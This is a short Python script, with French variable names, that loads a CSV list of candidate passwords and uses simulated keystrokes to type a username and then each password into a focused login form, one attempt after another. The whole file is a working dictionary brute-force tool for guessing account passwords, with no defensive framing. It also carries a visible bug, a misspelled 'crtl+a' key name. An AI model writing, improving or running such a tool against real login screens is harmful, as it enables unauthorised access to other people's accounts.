import csv
import keyboard
import time

mot_de_passe = []

def lecture_csv(c):
    with open(c, newline='',encoding='utf-8-sig') as csvfile:
        fichier = csv.DictReader(csvfile, delimiter=',')
        for ligne in fichier :
            mot_de_passe.append(dict(ligne))
        print('////')
        print('////')
        print(mot_de_passe)
        return mot_de_passe
    
def decompte():
    for i in range(5):
        print(5-i)
        time.sleep(1)
    print('GO')
    
username = input('Enter username: ')
dictionary = input('Enter dictionary: ')
lecture_csv(dictionary)
print(mot_de_passe)
decompte()
keyboard.write(username)
keyboard.press_and_release('tab')
time.sleep(0.5)
for i in range(len(mot_de_passe)):
    keyboard.write(mot_de_passe[i]['motdepasse'])
    keyboard.press_and_release('enter')
    print(mot_de_passe[i]['motdepasse'])
    time.sleep(0.5)
    keyboard.press_and_release('crtl+a')

    keyboard.press_and_release('delete')


    
